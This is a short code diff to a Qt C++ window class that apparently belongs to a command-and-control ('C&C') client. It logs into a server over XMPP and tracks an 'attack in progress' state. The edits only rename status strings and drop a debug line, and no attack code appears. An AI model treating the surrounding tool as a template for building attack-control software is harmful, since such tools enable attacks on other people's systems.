@@ -118,7 +118,7 @@ void MainWindow::readyOnXmppClient()
     setConnected(true);
     setAttackInProgress(false);
 
-    _centralWidget -> writeEvent(QString("Conectado a C&C como %1").arg(_xmppClient -> whoAmI()));
+    _centralWidget -> writeEvent(QString("Conectado a CC como %1").arg(_xmppClient -> whoAmI()));
 }
 
 void MainWindow::disconnectedOnXmppClient()
@@ -126,7 +126,7 @@ void MainWindow::disconnectedOnXmppClient()
     setConnected(false);
     setAttackInProgress(false);
 
-    _centralWidget -> writeEvent(QString("Desconectado de C&C"));
+    _centralWidget -> writeEvent(QString("Desconectado de CC"));
 }
 
 void MainWindow::responseReceivedOnXmppClient(Message *response)
@@ -215,8 +215,6 @@ void MainWindow::errorOnXmppClient(QXmppClient::Error error)
         QMessageBox::warning(this, tr("Conectar a CC"), tr("Usuario y/o contraseña incorrectos"), QMessageBox::Ok);
         break;
     }
-
-    qDebug() << "Error" << error;
 }
 
 void MainWindow::createWidgets()
